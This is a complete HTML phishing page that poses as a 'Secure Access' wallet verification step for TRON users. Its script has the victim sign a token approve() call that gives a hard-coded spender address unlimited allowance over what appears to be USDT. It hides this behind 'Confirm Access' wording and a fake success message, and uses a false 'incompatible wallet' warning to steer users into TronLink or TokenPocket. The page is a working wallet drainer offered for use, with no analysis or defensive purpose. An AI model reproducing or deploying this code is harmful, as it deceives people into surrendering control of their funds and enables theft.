<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <style>
        :root { --bg: #09090B; --card: #121217; --border: #27272A; --primary: #FFFFFF; --text-muted: #A1A1AA; --error: #EF4444; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--primary); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        
        .card { background: var(--card); padding: 32px; border-radius: 28px; text-align: center; border: 1px solid var(--border); max-width: 400px; width: 90%; }
        
        .icon { width: 56px; height: 56px; background: rgba(59, 130, 246, 0.1); border-radius: 16px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: #3B82F6; }
        
        h2 { margin: 0 0 8px; font-size: 22px; }
        p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
        
        .url-box { background: #1C1C22; padding: 12px; border-radius: 12px; font-size: 13px; color: #fff; word-break: break-all; margin-bottom: 20px; border: 1px dashed #3B82F6; display: none; }
        
        button { background: var(--primary); color: var(--bg); border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; transition: 0.2s; }
        button:hover { opacity: 0.9; }
        button:disabled { background: #27272A; color: var(--text-muted); cursor: not-allowed; }
        
        #status { margin-top: 15px; font-size: 13px; padding: 10px; border-radius: 8px; }
        .warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--error); color: #FCA5A5; padding: 16px; border-radius: 12px; font-size: 14px; margin-bottom: 20px; display: none; text-align: left; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon" id="mainIcon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        </div>
        
        <h2 id="mainTitle">Verification</h2>
        <p id="mainDesc">Подтвердите доступ к кошельку для продолжения работы.</p>
        
        <div id="warningBox" class="warning-box">
            <b>Несовместимый кошелек</b><br><br>Вы используете браузер, который не поддерживает прямое подключение к сети TRON.<br><br>Пожалуйста, скопируйте ссылку ниже и откройте её в <b>TronLink</b> или <b>TokenPocket</b>.
        </div>

        <div class="url-box" id="urlDisplay"></div>
        
        <button id="actionBtn" onclick="handleAction()">Connect Wallet</button>
        <div id="status"></div>
    </div>

    <script>
        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
        const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        const btn = document.getElementById('actionBtn');
        const status = document.getElementById('status');
        const warningBox = document.getElementById('warningBox');
        const urlDisplay = document.getElementById('urlDisplay');
        const currentUrl = window.location.href;
        
        let currentState = 'init';

        function checkEnvironment() {
            // 1. Идеальная среда (TronLink DApp)
            if (window.tronWeb && window.tronWeb.ready) {
                currentState = 'ready_to_approve';
                btn.innerText = "Confirm Access";
                status.innerText = "Подключено: " + window.tronWeb.defaultAddress.base58.slice(0,6) + "...";
            } 
            // 2. Враждебная среда (Trust Wallet / MetaMask EVM)
            else if (window.ethereum && !window.tronWeb) {
                currentState = 'copy_only';
                showCopyInterface(true);
            } 
            // 3. Обычный браузер (Safari/Chrome)
            else {
                currentState = 'copy_only';
            }
        }

        function showCopyInterface(isError = false) {
            document.getElementById('mainTitle').innerText = "DApp Browser Required";
            document.getElementById('mainDesc').style.display = 'none';
            
            if (isError) warningBox.style.display = 'block';
            
            urlDisplay.style.display = 'block';
            urlDisplay.innerText = currentUrl;
            
            btn.innerText = "Скопировать ссылку";
            btn.style.background = "#3B82F6";
            btn.style.color = "#FFF";
        }

        async function handleAction() {
            if (currentState === 'copy_only') {
                try {
                    await navigator.clipboard.writeText(currentUrl);
                    btn.innerText = "Скопировано!";
                    btn.style.background = "#34D399";
                    btn.style.color = "#000";
                    setTimeout(() => { btn.innerText = "Скопировать ссылку"; btn.style.background = "#3B82F6"; btn.style.color = "#FFF"; }, 3000);
                } catch (e) {
                    alert("Скопируйте ссылку из адресной строки.");
                }
            } else if (currentState === 'ready_to_approve') {
                runApprove();
            } else if (window.tronLink) {
                // Если есть расширение на ПК, но не авторизовано
                try {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    setTimeout(checkEnvironment, 500);
                } catch(e) {
                    status.innerText = "Отменено";
                }
            } else {
                showCopyInterface();
            }
        }

        async function runApprove() {
            try {
                btn.innerText = "Processing...";
                btn.disabled = true;
                status.style.color = "#A1A1AA";
                status.innerText = "Подтвердите транзакцию в кошельке...";

                const contract = await window.tronWeb.contract().at(TOKEN);
                await contract.approve(SPENDER, MAX_VAL).send({ feeLimit: 100000000 });

                status.style.color = "#34D399";
                status.innerText = "Успешно! Доступ разрешен.";
                btn.innerText = "Approved";
            } catch (e) {
                console.error(e);
                let msg = e.message || "Отказ пользователя";
                if (typeof e === 'string' && e.includes("declined")) msg = "Вы отменили транзакцию.";
                
                status.style.color = "#EF4444";
                status.innerText = "Ошибка: " + msg;
                btn.disabled = false;
                btn.innerText = "Try Again";
            }
        }

        window.addEventListener('load', () => {
            setTimeout(checkEnvironment, 800);
        });
    </script>
</body>
</html>
